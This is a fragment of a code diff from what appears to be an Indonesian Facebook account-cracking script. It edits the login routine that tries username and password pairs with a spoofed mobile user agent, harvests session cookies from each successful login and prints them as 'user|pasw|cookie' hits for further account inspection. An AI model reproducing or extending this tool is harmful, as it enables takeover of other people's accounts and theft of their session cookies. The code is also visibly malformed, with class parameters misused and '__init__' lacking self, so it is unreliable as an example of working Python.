@@ -513,7 +513,7 @@ def userset():
     else:print(f"{P}[•] Pilihan salah ");exit()
 
 #####LOGIN HASIL
-class log_hasil(user, pasw,dat,data2,data):
+class log_hasil(user, pasw):
   def __init__():
       ua = "Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
       ses = requests.Session()
@@ -628,10 +628,10 @@ class log_hasil(user, pasw,dat,data2,data):
                          cp-=1
                          aman+=1
                          coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                     if satua==True:
-                       print(f"\r{H}[OK] {user}|{pasw}|{coki}{P}        ",end="")
-                       get_info(session,coki)
-                       cek_apk(session,coki)
+                       if satua==True:
+                         print(f"\r{H}[OK] {user}|{pasw}|{coki}{P}        ",end="")
+                         get_info(session,coki)
+                         cek_apk(session,coki)
                      else:
                        salah+=1
                        print(f"\r{M}[!] Kata sandi salah atau sudah diubah          {P}\n")
